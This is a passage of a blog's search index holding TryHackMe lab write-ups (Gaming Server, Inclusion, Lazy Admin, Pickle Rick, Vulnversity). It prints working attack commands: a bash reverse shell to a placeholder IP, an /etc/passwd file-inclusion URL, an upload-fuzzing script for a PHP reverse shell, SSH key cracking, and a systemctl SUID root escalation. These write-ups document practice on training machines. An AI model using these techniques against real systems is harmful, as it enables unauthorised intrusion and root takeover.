Writeup","uri":"/posts/thm/dav/"},{"categories":null,"content":"Link : https://tryhackme.com/room/gamingserver ","date":"10-07-2021","objectID":"/posts/thm/gaming_server/:0:0","tags":["linpeas","lxd-alpine"],"title":"TryHackMe - Gaming Server Writeup","uri":"/posts/thm/gaming_server/"},{"categories":null,"content":"Enumeration First, let’s do an enumeration with the IP address of this machine. I’m gonna run Nmap [Netwok Mapper] to scan any open ports. I’m gonna run this command nmap -sC -sV -oN nmap/initial \u003cmachine ip\u003e ","date":"10-07-2021","objectID":"/posts/thm/gaming_server/:1:0","tags":["linpeas","lxd-alpine"],"title":"TryHackMe - Gaming Server Writeup","uri":"/posts/thm/gaming_server/"},{"categories":null,"content":"Explaining the nmap scan: -sC := scan using nmap default script -sV := scan for version -oN := output in normal format Nmap scan shows us. There are 2 ports open ssh and HTTP. First, I’m gonna check port 80 because not common for ssh to log in as anonymous. Let’s check it out. We’re found this web page. We know that this machine has a website. Let’s run the gobuster for finding a hidden directory in the background. I’ll run this command: gobuster dir -u http://\u003cmachine IP\u003e -w /path/to/wordlist.txt -x php Let’s the gobuster do his thing. Let’s enumerate this webpage manually. This is the very first thing I’m gonna do. You always need to check the page source code maybe we can find something interesting. Well, yes we did. WOW! that is unexpected, we’re found a potential user. Now, let’s play around with this website maybe we found something cool. YES! we’re found something cool guys. This section has an upload button. When I clicked it, it redirects me to best location. Let’s check all the items in this section. Well, the dict.lst file caught my eyes and it looks like a password list. Let’s download it. Let’s check our gobuster scan Gobuster found the hidden directory called /secret. It sounds cool to me. Let’s go to that directory. Oh! we’re found something cool!!!!!. It’s said secret key. So, let’s check it out. We found the RSA key. Looks like this key is encrypted. We’re can use john the ripper [JtR] to crack it. First, we need to download this file into our machine. ","date":"10-07-2021","objectID":"/posts/thm/gaming_server/:1:1","tags":["linpeas","lxd-alpine"],"title":"TryHackMe - Gaming Server Writeup","uri":"/posts/thm/gaming_server/"},{"categories":null,"content":"Foothold/Gaining Access First, we gonna use ssh2john to rewrite this key into a format that [JtR] can understand. Let’s run it. My ssh2john locate in the /opt directory. We, need to run this tool and save the output in the file called skey. If we can see. The file called skey was been created in our working directory. Now we can use [JtR] to crack the hashes and we gonna use the dict.lst file as the password wordlist. We’re found it. Before we ssh into that machine, we need to write our permission on the secretKey file. chmod 600 secretKey I’m gonna assume john is the user. If you remember we’re found his name in the HTML comment. Let’s try it. ssh -i secretKey john@\u003cmachine ip\u003e We’re in as john. Let’s find the user flag. ","date":"10-07-2021","objectID":"/posts/thm/gaming_server/:2:0","tags":["linpeas","lxd-alpine"],"title":"TryHackMe - Gaming Server Writeup","uri":"/posts/thm/gaming_server/"},{"categories":null,"content":"Privilege Escalation What I like to do is upload the shell script called linpeas. We’re gonna upload that script into the victim machine by using python simple server. In the victim machine. I love to go the /tmp directory and using wget tool to download the linpeas script. After that, we need to make that file executable with this command: chmod +x \u003cfile name\u003e and run it. ./\u003cfile name\u003e So, let’s check the scan result maybe we can found something interesting. Hmmm… we can see here that lxd is color-coded and to the honest this something new to me. Let’s try search lxd exploit on the internet. YES! we’re found it. You can check here for more info. First, I’m gonna download the lxd-alpine-builder. Using git clone and cd into that directory. After that, make sure you run the command with root or sudo. After this script is done running. The tar file will be created in our directory. First, I like to rename the tar file because it’s too long. I’m gonna name mine is alpine-v3.tar.gz. Now, we need to download the tar file from our victim machine. First, we need to run the python simple server in lxd-alpine-builder directory. python3 -m http.server To be honest, I can’t explain anything to you and I need to look up into this more. This is very new to me. You can go here for more info. Let’s find the root flag. ","date":"10-07-2021","objectID":"/posts/thm/gaming_server/:3:0","tags":["linpeas","lxd-alpine"],"title":"TryHackMe - Gaming Server Writeup","uri":"/posts/thm/gaming_server/"},{"categories":null,"content":"Conclusion I’ve learned a lot today. First, never put your ssh key on the website. Even it’s hidden the gobuster can find it with ease. The most important thing is I’ve learned that we can exploit the lxd. I’m making a quick google. it says lxd is the Linux Container. I don’t know what it is. I need to study more about this thing. Anyways, It’s cool and It’s new to me. This room so much fun and I hope you guys have fun and learn something new today. ","date":"10-07-2021","objectID":"/posts/thm/gaming_server/:4:0","tags":["linpeas","lxd-alpine"],"title":"TryHackMe - Gaming Server Writeup","uri":"/posts/thm/gaming_server/"},{"categories":null,"content":"Link : https://tryhackme.com/room/inclusion ","date":"10-07-2021","objectID":"/posts/thm/inclusion/:0:0","tags":["GTFOBins","lfi"],"title":"TryHackMe - Inclusion Writeup","uri":"/posts/thm/inclusion/"},{"categories":null,"content":"Enumeration First, let’s do an enumeration with the IP address of this machine. I’m gonna run Nmap [Netwok Mapper] to scan any open ports. I’m gonna run this command nmap -sC -sV -oN nmap/initial \u003cmachine ip\u003e ","date":"10-07-2021","objectID":"/posts/thm/inclusion/:1:0","tags":["GTFOBins","lfi"],"title":"TryHackMe - Inclusion Writeup","uri":"/posts/thm/inclusion/"},{"categories":null,"content":"Explaining the nmap scan: -sC := scan using nmap default script -sV := scan for version -oN := output in normal format So, the Nmap scan result came back. It looks like this machine has HTTP server. Let’s enumerate the webpage. I love to run something in the background. This is a webpage and I’m gonna run gobuster in the background while I enumerate this manually. Now, the name of this challenge is Inclusion. That name was really obvious and I’m gonna try the LFI attack to see if it’s working. Yes, it works! Here is the parameter I found. http://10.10.18.21/article?name=../../../../../../etc/passwd ","date":"10-07-2021","objectID":"/posts/thm/inclusion/:1:1","tags":["GTFOBins","lfi"],"title":"TryHackMe - Inclusion Writeup","uri":"/posts/thm/inclusion/"},{"categories":null,"content":"Foothold/Gaining Access Wait is that ssh password. We just found the ssh password in the /etc/passwd file COOL! let’s try to log in. I’M IN!!! let’s grab the user flag. ","date":"10-07-2021","objectID":"/posts/thm/inclusion/:2:0","tags":["GTFOBins","lfi"],"title":"TryHackMe - Inclusion Writeup","uri":"/posts/thm/inclusion/"},{"categories":null,"content":"Privilege Escalation First, I’m gonna use the sudo -l command to see anything that super interesting. OK WOW! This user can run the socat with sudo. I’m gonna search socat exploit to privilege escalation on this site GTFOBins. That was quick. Anyways, I’m a root now. Let’s hunt for the flag ","date":"10-07-2021","objectID":"/posts/thm/inclusion/:3:0","tags":["GTFOBins","lfi"],"title":"TryHackMe - Inclusion Writeup","uri":"/posts/thm/inclusion/"},{"categories":null,"content":"Conclusion I’ve learned a lot today. Make sure to configure the webpage properly because most of the attack vectors are on the webpage. Before I forgot, please configure the user account and the sudo command properly. This room so much fun and I hope you guys have fun and learn something new today. ","date":"10-07-2021","objectID":"/posts/thm/inclusion/:4:0","tags":["GTFOBins","lfi"],"title":"TryHackMe - Inclusion Writeup","uri":"/posts/thm/inclusion/"},{"categories":null,"content":"Link : https://tryhackme.com/room/lazyadmin ","date":"10-07-2021","objectID":"/posts/thm/lazy_admin/:0:0","tags":["cms","gobuster","crackstation"],"title":"TryHackMe - Lazy Admin Writeup","uri":"/posts/thm/lazy_admin/"},{"categories":null,"content":"Enumeration First, let’s do an enumeration with the IP address of this machine. I’m gonna run Nmap [Netwok Mapper] to scan any open ports. I’m gonna run this command nmap -sC -sV -oN nmap/initial \u003cmachine ip\u003e ","date":"10-07-2021","objectID":"/posts/thm/lazy_admin/:1:0","tags":["cms","gobuster","crackstation"],"title":"TryHackMe - Lazy Admin Writeup","uri":"/posts/thm/lazy_admin/"},{"categories":null,"content":"Explaining the nmap scan: -sC := scan using nmap default script -sV := scan for version -oN := output in normal format We can see this machine has 2 ports open. SSH and HTTP. Well, we all know most of the time SSH login requires a user \u0026 password. In this case, we don’t have any of those. Let’s enumerate the HTTP on port 80 runs on apache. Well, this leads me to the apache default page. However, we’ve got a tool called gobuster for helping us out. gobuster dir -u http://10.10.109.41 -w /opt/HidDirList/directory-medium.txt -x txt,php,html --no-error The result So, we’ve got the result. Let’s navigate to that page. Looks like nothing interesting but we know this thing is sweetrice cms [Content Management System] So, I’m gonna using gobuster again on that directory to find anything interesting pop-up. Just wait and see. WOW! we’ve found a lot of hidden directories, let’s take a look gobuster dir -u http://10.10.109.41/content -w /opt/HidDirList/directory-medium.txt -x txt,php,html --no-error You know we’ve got a lot of directories here. I’ve found that /inc directory have a lot of files and I noticed they have MySQL backup file. Let’s download it and see what’s inside. It’s so miracle we’ve found the username and the password hash in that backup file. I’m using crackstation to crack that hash and we’ve found it. Let’s try to log in with the credentials we’ve found. YES! we’re in but I noticed this CMS is version 1.5.1 Like any good and wise man will do. Find the exploit for that CMS on google. That’s unexpected, we’ve found a lot of exploits. Well, I found this exploit and it’s quite understandable. ","date":"10-07-2021","objectID":"/posts/thm/lazy_admin/:1:1","tags":["cms","gobuster","crackstation"],"title":"TryHackMe - Lazy Admin Writeup","uri":"/posts/thm/lazy_admin/"},{"categories":null,"content":"Foothold/Gaining Access First, I’m gonna navigate myself into the ads section. Well, we’ve found the textarea. So, I’m gonna copy and paste the whole PHP code in that thing and save it as shell.php After uploaded, goes to this directory /content/inc/ads and you gonna find your uploaded reverse shell file and double-click on it, and viola. I have 2 for testing purpose we’re in And we’ve finally found the user flag. Now, let’s hunt the big boy flag ;) ","date":"10-07-2021","objectID":"/posts/thm/lazy_admin/:2:0","tags":["cms","gobuster","crackstation"],"title":"TryHackMe - Lazy Admin Writeup","uri":"/posts/thm/lazy_admin/"},{"categories":null,"content":"Privilege Escalation Now, we’ve got the file on our machine. Anyways, Let’s enumerate this machine more. First, I’m gonna use the sudo -l command to see anything that super interesting. WOW! that’s super strange. Let’s take a look at that file I just realize the file is Perl extensions. Anyways, that file only accessible by root. Sorry, gotta change the terminal. Terminator crash for the moment. We know that’s backup.pl execute something from /etc/copy.sh Let’s take a look. I’m not expected this at all. Remember copy.sh file. lol, I just mention it. We can edit that file. So, I’m gonna put the bash command. When execute it’s gonna make /bin/bash as SUID Now, let’s execute it and become root. Let’s find the root flag ","date":"10-07-2021","objectID":"/posts/thm/lazy_admin/:3:0","tags":["cms","gobuster","crackstation"],"title":"TryHackMe - Lazy Admin Writeup","uri":"/posts/thm/lazy_admin/"},{"categories":null,"content":"Conclusion I’ve learned a lot today. Always, update your system. In this case, an attacker can steal your private information also can abuse your CMS and got a foothold. That’s very dangerous. The most important thing, please configure your file permission carefully. Also, put the freaking password on your user or any account. Make sure it’s a very long and secured password. This room so much fun and I hope you guys have fun and learn something new today. ","date":"10-07-2021","objectID":"/posts/thm/lazy_admin/:4:0","tags":["cms","gobuster","crackstation"],"title":"TryHackMe - Lazy Admin Writeup","uri":"/posts/thm/lazy_admin/"},{"categories":null,"content":"Link : https://tryhackme.com/room/picklerick ","date":"10-07-2021","objectID":"/posts/thm/pickle_rick/:0:0","tags":["gobuster"],"title":"TryHackMe - Pickle Rick Writeup","uri":"/posts/thm/pickle_rick/"},{"categories":null,"content":"Enumeration First, let’s do an enumeration with the IP address of this machine. I’m gonna run Nmap [Netwok Mapper] to scan any open ports. I’m gonna run this command nmap -sC -sV -oN nmap/initial \u003cmachine ip\u003e ","date":"10-07-2021","objectID":"/posts/thm/pickle_rick/:1:0","tags":["gobuster"],"title":"TryHackMe - Pickle Rick Writeup","uri":"/posts/thm/pickle_rick/"},{"categories":null,"content":"Explaining the nmap scan: -sC := scan using nmap default script -sV := scan for version -oN := output in normal format Nmap scan shows us. There are 2 ports open ssh and HTTP. First, I’m gonna check port 80 because not common for ssh to log in as anonymous. Let’s check it out. Cool! we got this web page This is the very first thing I’m gonna do. You always need to check the page source code maybe we can find something interesting. Well, yes we did. In this page source. We can see the comment says Note to self, remember username!. We have a username. Unfortunately, we don’t know where to log in as this username. Well, I’m gonna run gobuster. Gobuster is a tool to find the hidden directory on this website gobuster dir -u http://\u003cmachine ip\u003e -w /path/to/wordlist.txt -x php,.txt,.html The scan result shows us the hidden directory called login.php with status code 200 and we also found robots.txt Let’s take a look at the login.php and robots.txt If you remember. In the beginning, we found the username. If you look closely at the robots.txt it looks like something, maybe it is the password. Let’s try it. wow! it’s working. We can see on this page, we can run the command in that box. So, I’m gonna execute reverse shell on that to make an easy foothold. ","date":"10-07-2021","objectID":"/posts/thm/pickle_rick/:1:1","tags":["gobuster"],"title":"TryHackMe - Pickle Rick Writeup","uri":"/posts/thm/pickle_rick/"},{"categories":null,"content":"Foothold/Gaining Access bash -c ‘bash -i \u003e\u0026 /dev/tcp/\u003cyour ip\u003e/\u003clistening port\u003e 0\u003e\u00261’ First, what I like to do is run the sudo -l command to check sudo permission/capability. After, we ran that command. It says “(ALL) NOPASSWD: ALL”. This says ‘Hey dude! you can run sudo without a password at all and be free to use it’. This happens because of not properly configure the user and root. Now, Let’s try find the first ingredient Rick needs. Ok. We just have the first ingredient. However, We need two more the ingredient. So, let’s try to see any user home directory exists. Look like the user rick exists. Let’s try to check it out. ","date":"10-07-2021","objectID":"/posts/thm/pickle_rick/:2:0","tags":["gobuster"],"title":"TryHackMe - Pickle Rick Writeup","uri":"/posts/thm/pickle_rick/"},{"categories":null,"content":"Privilege Escalation As we know, This user www-data can run sudo without a password at all. This means we can be root by running the command sudo su. WoW! We just solve this box with ease and gain a lot of knowledge. ","date":"10-07-2021","objectID":"/posts/thm/pickle_rick/:3:0","tags":["gobuster"],"title":"TryHackMe - Pickle Rick Writeup","uri":"/posts/thm/pickle_rick/"},{"categories":null,"content":"Conclusion I’ve learned a lot today. This shows us how dangerous it is if you don’t configure something properly. In this case, the sudo command. However, An attacker can be root in your machine if they have a good and strong foothold. Well, before an attacker can access make sure you have to patch all of your weak systems. In this machine, the website can execute bash. This is bad and an attacker easily got the reverse shell. This room so much fun and I hope you guys have fun and learn something new today. ","date":"10-07-2021","objectID":"/posts/thm/pickle_rick/:4:0","tags":["gobuster"],"title":"TryHackMe - Pickle Rick Writeup","uri":"/posts/thm/pickle_rick/"},{"categories":null,"content":"Link : https://tryhackme.com/room/vulnversity ","date":"10-07-2021","objectID":"/posts/thm/vulnversity/:0:0","tags":["upload-vuln","GTFOBins"],"title":"TryHackMe - Vulnversity Writeup","uri":"/posts/thm/vulnversity/"},{"categories":null,"content":"Enumeration First we need to do reconnaissance by using nmap (Network Mapper) to find open ports and to understand the machine. I’m gonna run this command: nmap -sC -sV -O -oN nmap/initial \u003cmachine ip\u003e ","date":"10-07-2021","objectID":"/posts/thm/vulnversity/:1:0","tags":["upload-vuln","GTFOBins"],"title":"TryHackMe - Vulnversity Writeup","uri":"/posts/thm/vulnversity/"},{"categories":null,"content":"Explaining the nmap scan: -sC := scan using nmap default script -sV := scan for version -O := scan for OS (operating system) -oN := output in normal format Now our nmap scan is done. So, let’s do bad thing evil grin lol. Just joking okayy. We can see this machine have 6 ports open. The result always screaming that lot of services running on ubuntu. We can see that this machine also have squid proxy and the version too. So, first maybe we can try ftp login as anonymous but unfortunately we cannot login ftp as anonymous. This machine have http on port 3333 and running on apache web server. Let’s take a look! OH! what a lovely website. We know that they have a website and we can enumerate futher by using gobuster tool. Gobuster is a tool for searching hidden directory in the web. If you doesn’t have gobuster. You…. yeah…youuu can visit this github repos. Let’s run gobuster using this command gobuster dir -u http://10.10.111.81:3333/ -w /opt/directory-medium.txt --no-error ","date":"10-07-2021","objectID":"/posts/thm/vulnversity/:1:1","tags":["upload-vuln","GTFOBins"],"title":"TryHackMe - Vulnversity Writeup","uri":"/posts/thm/vulnversity/"},{"categories":null,"content":"Explaining gobuster flag: dir := using directory mode -u := specify url -w := specify wordlist –no-error := no error So, here’s the result. If you look super close but not at the monitor though jk. Gobuster found a hidden directory called /internal. Let’s go to that hidden directory. Apparently, that’s directory leads us to this page a.k.a upload page. We can upload php reverse shell on that. ","date":"10-07-2021","objectID":"/posts/thm/vulnversity/:1:2","tags":["upload-vuln","GTFOBins"],"title":"TryHackMe - Vulnversity Writeup","uri":"/posts/thm/vulnversity/"},{"categories":null,"content":"Foothold/Gaining Access But how to get php reverse shell and how to setup, even how to use it. (it’s okay I got you ladies \u0026 gentlemen) Go to this site here Download it or you can copy it. If you copy it, make sure to save it in the file with php extensions. example := revshell.php Open the file and change the ip address to yours tryhackme ip address, If you want to change the port. Just change it. The port in this case is going to be a listing port. original alter with ip and port However, when we upload a php file to the page it’s gonna response ‘extension not allowed’. Looking back at the questions ‘TASK 4’. Now we know that we can fuzz this upload page with different file extensions. So, I gonna make python script for that. You can use burpsuite if you want to. Why I’m using python script??? because I want to learn duhhh and I’m not saying that I really good in python NO. TBH I wacthed a lot of tutorial for just simple task and I keep adding time in this box. man oh man. It’s worth it tho. So here is my script #!/usr/bin/python3 import requests import os url = \"http://10.10.111.81:3333/internal/\" action = \"/index.php\" data = { 'file':'/index.php', 'submit':'Submit' } oldfile = \"revshell.php\" file = \"revshell\" extensions = ['.php','.php3','.php4','.php5','.phtml'] for ext in extensions: newfile = file + ext rename = os.rename(oldfile, newfile) file_to_upload = {'file': open(newfile, 'rb')} r = requests.post(url + action, data=data, files=file_to_upload) if \"Extension not allowed\" in r.text: print(f\"This file not allowed : {newfile}\") else: print(f\"This file is allowed : {newfile}\") oldfile = newfile Let’s run the script and finally yes. We got a hit boys. This page only accept .phtml extensions. COOL Now we need to setup netcat listener to the port that we change in the our reverse shell. If you can see I’m listen to the port 6969, because I’m using this port in my reverse shell nc -lnvp 6969 To activated our reverse shell go to this url http://10.10.111.81:3333/internal/uploads/ . But how you found the /uploads directory. Good questions. Just run gobuster against /internal directory. We found this. To activated our shell just double click at our reverse shell file. Mine here name revshell.phtml but yours maybe different. I don’t know because this is mine not yourssss!!!! joking of course. Please don’t be offended. HAHAHAHAH jk. Now we’re in!!!!Now let’s hunt the user flag. So, let’s navigate ourselves to the home directory to list a user directory. WOW!!! now we know that bill the one who manage this webserver. Let’s go into bill’s home directory to find user flag. Yes we got a user flag. To read this flag you need to use the cat command ","date":"10-07-2021","objectID":"/posts/thm/vulnversity/:2:0","tags":["upload-vuln","GTFOBins"],"title":"TryHackMe - Vulnversity Writeup","uri":"/posts/thm/vulnversity/"},{"categories":null,"content":"Privilege Escalation How to be root. Now we can do a basic enumeration if you want. Anyways, the questions ask what the most stand out file in SUID file. To find this file called SUID we need run this command find / -user root -perm -4000 -exec ls -ldb {} \\; 2\u003e/dev/ So, this command means find all SUID file that owns by root user. After find it, make it the file in the list using ls. If we got an errors please don’t display the errors to us. We got all of this but how to find the one that most stand out. You can make your linux machine as the base line. Try run the same command in your box and try compare it. In this case the file called /bin/systemctl the most stands out. So, we’re gonna use systemctl to be root but how. Easy, just go to this site called GTFObins . Try search systemctl suid in it. So, I don’t know where is the flag are. What I’m gonna do, is to make file /bin/bash as SUID. Hmm, sound fun! With it we can be root or to be specific euid root To use this command just take all and copy it in the box TF=$(mktemp).service echo '[Service] Type=oneshot ExecStart=/bin/sh -c \"chmod +s /bin/bash\" [Install] WantedBy=multi-user.target' \u003e $TF /bin/systemctl link $TF /bin/systemctl enable --now $TF After you’ve done copy and paste that command. Run /bin/bash -p and now become root. Just navigate through root directory and you found the flag ","date":"10-07-2021","objectID":"/posts/thm/vulnversity/:3:0","tags":["upload-vuln","GTFOBins"],"title":"TryHackMe - Vulnversity Writeup","uri":"/posts/thm/vulnversity/"},{"categories":null,"content":"Conclusion I’ve learned a lot today. If you have an upload page on your website make sure you use the filter options. Filter out the bad file to make your site a bit safer. Also, you must configure your file permission very-very-very-very-very good. If you see, I become root with simple misconfigure file permission and that’s it. This room so much fun and I hope you guys have fun and learn something new today. ","date":"10-07-2021","objectID":"/posts/thm/vulnversity/:4:0","tags":["upload-vuln","GTFOBins"],"title":"TryHackMe - Vulnversity Writeup","uri":"/posts/thm/vulnversity/"}]